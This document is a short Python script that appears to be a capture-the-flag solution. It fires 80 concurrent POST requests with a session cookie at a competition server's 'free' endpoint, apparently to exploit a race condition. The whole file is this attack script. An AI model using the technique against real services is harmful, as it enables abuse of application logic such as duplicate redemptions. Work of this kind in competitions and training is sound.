import requests
import multiprocessing as mp
cookie = {'session':''}
def post(url):
    return requests.post(url+'free',cookies=cookie)
urls = ["http://tcp.olymp.hackforces.com:8090/" for i in range(80)]
if __name__ == '__main__':
    with mp.Pool(10) as pool:
        res = pool.map(post, urls)
        print(res)